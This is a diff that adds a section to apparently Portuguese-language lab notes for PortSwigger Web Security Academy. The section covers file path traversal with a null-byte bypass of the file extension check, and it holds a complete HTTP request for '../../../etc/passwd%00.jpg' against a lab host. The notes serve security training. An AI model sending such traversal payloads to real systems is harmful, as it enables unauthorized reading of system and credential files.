@@ -76,6 +76,21 @@ Connection: close
 
 ````
 
+### >> 6. File path traversal, validation of file extension with null byte bypass
+Crie uma requisição GET contendo o caminho do arquivo a ser lido
+
+````http
+GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
+Host: ac491fa91eae86f5c0c5043900fb008a.web-security-academy.net
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Connection: close
+
+
+````
+
 
 
 ## File upload vulnerabilities 
